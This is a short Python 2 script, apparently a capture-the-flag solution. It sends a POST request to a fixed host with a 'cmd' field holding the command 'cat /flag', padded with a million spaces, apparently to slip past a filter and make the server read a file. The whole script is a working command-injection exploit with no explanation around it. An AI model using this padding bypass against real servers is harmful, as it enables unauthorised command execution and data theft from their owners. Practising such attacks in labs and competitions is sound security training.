#!/usr/bin/env python2

import requests

URL = 'http://2xwioaun.at-tech.xyz/'
padding = ' ' * 1000000

r = requests.post(URL, data={'cmd': '{"cmd": "cat /flag"}' + padding})
print(r.content)
